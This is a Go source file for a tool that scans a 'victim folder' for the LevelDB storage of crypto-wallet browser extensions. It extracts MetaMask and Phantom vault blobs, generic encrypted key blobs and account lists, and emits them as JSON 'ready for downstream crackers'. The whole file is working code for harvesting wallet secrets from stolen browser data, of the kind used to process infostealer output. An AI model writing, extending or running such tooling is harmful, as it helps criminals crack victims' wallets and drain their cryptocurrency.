package wallets

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"github.com/syndtr/goleveldb/leveldb"
	"github.com/syndtr/goleveldb/leveldb/opt"
	"github.com/syndtr/goleveldb/leveldb/storage"
)

// VaultRecord is the structured emission for one extracted LevelDB
// entry worth downstream attention: an encrypted vault blob or a
// cleartext public-accounts list.
//
// Written to stdout as one JSON object per line for pipeline consumers.
type VaultRecord struct {
	WalletFamily string          `json:"wallet_family"`
	WalletName   string          `json:"wallet_name"`
	ExtensionID  string          `json:"extension_id"`
	SourceDir    string          `json:"source_dir"`
	VaultKey     string          `json:"vault_key"`      // LevelDB key (printable rendering)
	Shape        string          `json:"shape"`          // 'metamask_vault' | 'phantom_vault' | 'public_accounts' | 'encrypted_blob'
	Payload      json.RawMessage `json:"payload"`        // decoded JSON value, ready for downstream crackers
}

// FindWalletDirs walks a victim folder and returns every LevelDB
// directory that belongs to a known wallet extension. Two conventions
// are recognized:
//
//   1. LocalStorage:  .../Local Extension Settings/<ext_id>/
//                     parent-dir basename == ext_id
//   2. IndexedDB:     .../IndexedDB/chrome-extension_<ext_id>_0.indexeddb.leveldb/
//                     dir name matches the chrome-extension_ prefix
//                     and contains the ext_id as a substring
//
// Match also requires a CURRENT sentinel file (the LevelDB manifest
// pointer) before the dir is reported as a hit.
func FindWalletDirs(root string) ([]WalletDirHit, error) {
	var hits []WalletDirHit
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if !d.IsDir() {
			return nil
		}
		ext, kind, ok := classifyWalletDir(d.Name())
		if !ok {
			return nil
		}
		if _, err := os.Stat(filepath.Join(path, "CURRENT")); err != nil {
			return nil
		}
		hits = append(hits, WalletDirHit{Path: path, Extension: ext, Kind: kind})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return hits, nil
}

// classifyWalletDir returns the extension, storage kind, and a hit
// flag for a directory basename. Supports the two Chromium extension-
// storage conventions.
func classifyWalletDir(basename string) (KnownExtension, StorageKind, bool) {
	if ext, ok := LookupByID(basename); ok {
		return ext, StorageLocal, true
	}
	const idbPrefix = "chrome-extension_"
	const idbSuffix = "_0.indexeddb.leveldb"
	if strings.HasPrefix(basename, idbPrefix) && strings.HasSuffix(basename, idbSuffix) {
		mid := basename[len(idbPrefix) : len(basename)-len(idbSuffix)]
		if ext, ok := LookupByID(mid); ok {
			return ext, StorageIndexedDB, true
		}
	}
	return KnownExtension{}, "", false
}

// StorageKind tags which Chromium storage API hosts the wallet data.
// Determines which goleveldb comparator must be registered when
// opening the directory.
type StorageKind string

const (
	StorageLocal     StorageKind = "localstorage"
	StorageIndexedDB StorageKind = "indexeddb"
)

// WalletDirHit pairs a filesystem path with the wallet extension it
// represents and the storage convention.
type WalletDirHit struct {
	Path      string
	Extension KnownExtension
	Kind      StorageKind
}

// ExtractVaults opens one wallet LevelDB directory read-only and
// returns every key/value pair whose value shape qualifies for one
// of four downstream-interesting categories:
//
//   - metamask_vault     {data, iv, salt} base64 strings
//   - phantom_vault      {content: {encrypted, kdf, iterations, salt, nonce}}
//   - public_accounts    anything whose key contains 'account' and value
//                        has cleartext addresses (bip122:, 0x..., etc.)
//   - encrypted_blob     generic: has 'encrypted' field + one of salt/iv/nonce
//
// Values are often double-JSON-encoded (a JSON string containing JSON).
// We unwrap one layer of JSON-string-encoding transparently.
func ExtractVaults(dir string, ext KnownExtension, kind StorageKind) ([]VaultRecord, error) {
	options := &opt.Options{
		ReadOnly:          true,
		ErrorIfMissing:    true,
		DisableBlockCache: true,
	}
	if kind == StorageIndexedDB {
		// IndexedDB-backed LevelDBs use the Chromium-custom 'idb_cmp1'
		// comparator. goleveldb refuses to open without a matching name.
		options.Comparer = idbComparer{}
	}
	db, err := leveldb.OpenFile(dir, options)
	if err != nil {
		if errors.Is(err, storage.ErrLocked) {
			return nil, fmt.Errorf("leveldb locked (another process?): %w", err)
		}
		return nil, fmt.Errorf("leveldb open %q: %w", dir, err)
	}
	defer db.Close()

	iter := db.NewIterator(nil, nil)
	defer iter.Release()

	var out []VaultRecord
	for iter.Next() {
		rec := classify(iter.Key(), iter.Value())
		if rec == nil {
			continue
		}
		rec.WalletFamily = ext.Family
		rec.WalletName = ext.Name
		rec.ExtensionID = ext.ID
		rec.SourceDir = dir
		out = append(out, *rec)
	}
	if err := iter.Error(); err != nil {
		return out, fmt.Errorf("leveldb iterate %q: %w", dir, err)
	}
	return out, nil
}

// classify inspects one (key, value) pair and returns a VaultRecord if
// the value shape is downstream-interesting. Returns nil otherwise.
func classify(k, v []byte) *VaultRecord {
	// Strip Chromium's 0x00 / 0x01 LocalStorage value-type prefix bytes.
	raw := stripPrefix(v)
	// Values are often JSON-encoded strings wrapping another JSON object.
	// Try to unwrap one layer of string-encoding.
	payload := tryUnwrapString(raw)

	// Must parse as a JSON object to be classifiable.
	var obj map[string]json.RawMessage
	if err := json.Unmarshal(payload, &obj); err != nil {
		return nil
	}

	keyStr := decodeChromiumKey(k)
	shape := detectShape(keyStr, obj)
	if shape == "" {
		return nil
	}
	// Re-marshal the parsed object to drop any trailing garbage
	// (null padding, UTF-16 remnants) that would break downstream JSON
	// encoders even when the parser accepted it.
	clean, err := json.Marshal(obj)
	if err != nil {
		return nil
	}
	return &VaultRecord{
		VaultKey: keyStr,
		Shape:    shape,
		Payload:  clean,
	}
}

// detectShape returns the Shape slug for a parsed JSON object, or ""
// if it is not downstream-interesting.
func detectShape(key string, obj map[string]json.RawMessage) string {
	keyLower := strings.ToLower(key)

	_, hasData := obj["data"]
	_, hasIV := obj["iv"]
	_, hasSalt := obj["salt"]
	_, hasContent := obj["content"]
	_, hasEncrypted := obj["encrypted"]
	_, hasNonce := obj["nonce"]
	_, hasAccounts := obj["accounts"]

	// Metamask classic vault: {data, iv, salt}
	if hasData && hasIV && hasSalt {
		return "metamask_vault"
	}

	// Phantom-style wrapper: {content: {encrypted, salt, nonce, ...}}
	if hasContent {
		var inner map[string]json.RawMessage
		if json.Unmarshal(obj["content"], &inner) == nil {
			_, innerEnc := inner["encrypted"]
			_, innerSalt := inner["salt"]
			if innerEnc && innerSalt {
				return "phantom_vault"
			}
		}
	}

	// Public-accounts list (key must hint at accounts; value must carry
	// an 'accounts' field or an addresses structure).
	if strings.Contains(keyLower, "account") && hasAccounts {
		return "public_accounts"
	}

	// Generic encrypted blob: has 'encrypted' + one of salt/nonce/iv.
	if hasEncrypted && (hasSalt || hasNonce || hasIV) {
		return "encrypted_blob"
	}

	// An 'encryptedKey' wrapper (seen on Phantom):
	if _, ok := obj["encryptedKey"]; ok {
		return "encrypted_blob"
	}

	return ""
}

// stripPrefix removes Chromium's one-byte LocalStorage value-type prefix
// (0x00 or 0x01) when present. A leading 0x01 marks a UTF-8 value; 0x00
// marks a UTF-16-LE one. We treat both the same and let the UTF-16 path
// handle conversion.
func stripPrefix(v []byte) []byte {
	if len(v) == 0 {
		return v
	}
	if v[0] == 0x00 && len(v) > 1 && v[1] == 0x00 {
		// UTF-16-LE with explicit NUL high bytes: collapse to UTF-8.
		b := make([]byte, 0, len(v)/2)
		for i := 2; i+1 < len(v); i += 2 {
			if v[i+1] != 0x00 {
				// non-ASCII codepoint; stop (preserves partial result)
				break
			}
			b = append(b, v[i])
		}
		return b
	}
	if v[0] == 0x01 {
		return v[1:]
	}
	return v
}

// tryUnwrapString handles double-JSON-encoded values. If the payload is
// a JSON-encoded STRING, return the decoded string bytes; otherwise
// return the payload unchanged.
func tryUnwrapString(buf []byte) []byte {
	if len(buf) == 0 || buf[0] != '"' {
		return buf
	}
	var s string
	if err := json.Unmarshal(buf, &s); err != nil {
		return buf
	}
	return []byte(s)
}

// decodeChromiumKey renders a LevelDB key as an operator-readable
// string. Keys can carry binary prefixes; strip them and keep the
// printable tail.
func decodeChromiumKey(k []byte) string {
	tail := k
	for len(tail) > 0 && (tail[0] == 0x00 || tail[0] == 0x01) {
		tail = tail[1:]
	}
	var b strings.Builder
	for _, c := range tail {
		if c >= 0x20 && c < 0x7F {
			b.WriteByte(c)
		}
	}
	return b.String()
}
